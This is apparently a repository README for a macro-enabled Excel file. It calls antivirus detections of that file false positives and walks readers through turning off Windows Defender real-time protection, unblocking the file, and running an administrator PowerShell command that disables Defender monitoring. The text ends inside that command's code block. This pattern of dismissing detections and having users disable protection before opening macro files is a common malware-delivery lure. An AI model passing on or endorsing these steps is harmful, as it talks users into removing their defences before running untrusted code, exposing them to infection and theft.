# ⚠️ Important Notice Before Downloading This Repo

## 🧠 Context

This repository contains a **macro-enabled Excel file (.xlsm)** that includes legitimate VBA code to automate tasks. Unfortunately, **Windows Defender** (and some other antivirus tools) tend to **overreact** and flag `.xlsm` files as threats — even when they're completely safe.

## 😤 Why This Happens

Microsoft Defender uses aggressive heuristics that often treat **any macro-enabled Excel file** as suspicious, especially if downloaded from the internet or extracted from a `.zip`. This is a **false positive**, but Defender may:

- Quarantine or delete the `.xlsm` file immediately after extraction
- Prevent you from opening or saving the file
- Block macros even if you trust the source

## 🛠️ Workaround (a.k.a. How to Not Let Defender Ruin Your Day)

Before downloading or extracting this repo:

1. **Temporarily pause Windows Defender real-time protection**:
   - Open **Windows Security**
   - Go to **Virus & threat protection**
   - Click **Manage settings**
   - Toggle **Real-time protection** to **Off**

2. **Download the ZIP** of this repository and extract it.

3. **Unblock the file manually**:
   - Right-click the `.xlsm` file → **Properties**
   - Check **"Unblock"** at the bottom (if present) → Click **OK**

4. **Re-enable Defender** (optional but recommended after extraction).

## 🧪 PowerShell Alternative

If you're a PowerShell fan, run this as Administrator to pause Defender:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
